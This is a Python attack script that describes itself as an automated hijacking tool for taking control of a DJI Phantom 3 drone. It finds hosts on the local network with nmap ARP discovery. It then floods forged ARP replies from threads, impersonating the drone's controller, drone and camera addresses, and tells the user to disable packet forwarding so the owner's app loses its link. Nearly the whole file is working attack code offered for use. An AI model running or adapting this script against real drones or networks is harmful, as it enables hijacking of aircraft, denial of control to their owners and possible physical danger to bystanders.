#!/usr/bin/python3
# Reference: https://rubysash.com/programming/python/python-3-multi-threaded-ping-sweep-scanner/
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import netifaces
import ipaddress
import threading  # for threading functions, lock, queue
from queue import Queue  # https://docs.python.org/3/library/queue.html
import nmap3  # https://pypi.org/project/python3-nmap/
import argparse


def get_current_subnet(interface):
    """Returns the CIDR of the given network interface.

    Args:
      interface: The name of the network interface.

    Returns:
      A string representing the CIDR of the network interface.
    """
    try:
        interface_addresses = netifaces.ifaddresses(interface)
        ip_info = interface_addresses[netifaces.AF_INET][0]
        ip_address = ip_info["addr"]
        netmask = ip_info["netmask"]
        netmask_cidr = ipaddress.IPv4Network(
            f"0.0.0.0/{netmask}", strict=False
        ).prefixlen
        return f"{ip_address}/{netmask_cidr}"
    except KeyError:
        print(f"No IPv4 address assigned to {interface}")
    except ValueError:
        print(f"Interface {interface} does not exist")
    except Exception as e:
        print(f"An error occurred: {e}")

    return None


def get_active_hosts_nmap_arp(interface):
    subnet = get_current_subnet(interface)
    nmap = nmap3.NmapHostDiscovery()
    print(colors.red + f"Scanning subnet: {subnet}" + colors.reset)
    results = nmap.nmap_arp_discovery(subnet, args="-e " + interface)
    active_hosts = []
    for k, v in results.items():
        if "state" in v and v["state"]["state"] == "up":
            active_hosts.append(k)
    return active_hosts


def arp_poisoning(args, src_ip, dst_ip, interface):
    src_mac = get_if_hwaddr(interface)
    dst_mac = getmacbyip(dst_ip)

    E = Ether(dst=dst_mac, src=src_mac)
    A = ARP(
        op=2,
        hwsrc=src_mac,
        psrc=src_ip,
        hwdst=dst_mac,
        pdst=dst_ip,
    )

    pkt = E / A
    if args.verbose == True:
        pkt.show()
    count = 0
    while count < 30:
        sendp(pkt, iface=interface, verbose=False)
        time.sleep(0.5)
        count += 1


class colors:
    reset = "\033[0m"
    red = "\033[31m"
    green = "\033[32m"
    orange = "\033[33m"
    blue = "\033[34m"
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


if __name__ == "__main__":
    banner = (
        colors.red
        + r"""
 ____  _                 _                  _____   _  ___ _ _           
|  _ \| |__   __ _ _ __ | |_ ___  _ __ ___ |___ /  | |/ (_) | | ___ _ __ 
| |_) | '_ \ / _` | '_ \| __/ _ \| '_ ` _ \  |_ \  | ' /| | | |/ _ \ '__|
|  __/| | | | (_| | | | | || (_) | | | | | |___) | | . \| | | |  __/ |   
|_|   |_| |_|\__,_|_| |_|\__\___/|_| |_| |_|____/  |_|\_\_|_|_|\___|_|   
"""
        + "\n"
        + colors.blue
        + "author: "
        + colors.green
        + "zhong/2h0ng"
        + "\n"
        + colors.blue
        + "email: "
        + colors.green
        + "superboyzjc@gmail.com"
        + "\n"
        + colors.reset
    )
    print(banner)

    parser = argparse.ArgumentParser(
        description="This is an automated hijacking script, aimed to take over the control of DJI3 Phantom3."
    )
    parser.add_argument(
        "-a",
        "--attacker",
        help="Required Attacker IP Address",
        required=True,
    )
    parser.add_argument(
        "-i",
        "--interface",
        default=str(conf.iface),
        help="Specify network interface",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        default=False,
    )
    args = parser.parse_args()

    interface = args.interface

    print(
        colors.WARNING
        + """Note: 
        1. Make sure disable the packet forwarding configuration by `sudo sysctl net.ipv4.ip_forward=0`
        2. Keep your DJI GO APP open, waiting for control hijacking
            """
        + colors.reset
    )
    spoofed_hosts = get_active_hosts_nmap_arp(interface)
    print(colors.red + "Found active hosts:" + colors.reset)
    for ip in spoofed_hosts:
        print(
            # colors.OKBLUE
            "IP: "
            # + colors.reset
            + f"{ip}, "
            # + colors.OKBLUE
            + "MAC: "
            # + colors.reset
            + f"{getmacbyip(ip)}"
        )
    # 1 - controller, 2 - drone, 3 - camera
    src_ips = ["192.168.1.1", "192.168.1.2", "192.168.1.3"]

    threads = []
    print(colors.red + "Arp Spoofing ..." + colors.reset)
    for src_ip in src_ips:
        for dst_ip in spoofed_hosts:
            # skip poisoning attacker and drones
            if dst_ip == args.attacker or dst_ip in src_ips:
                continue
            thread = threading.Thread(
                target=arp_poisoning, args=(args, src_ip, dst_ip, interface)
            )
            threads.append(thread)

    # Start all threads
    for thread in threads:
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    print(colors.red + "ARP poisoning attack completed." + colors.reset)
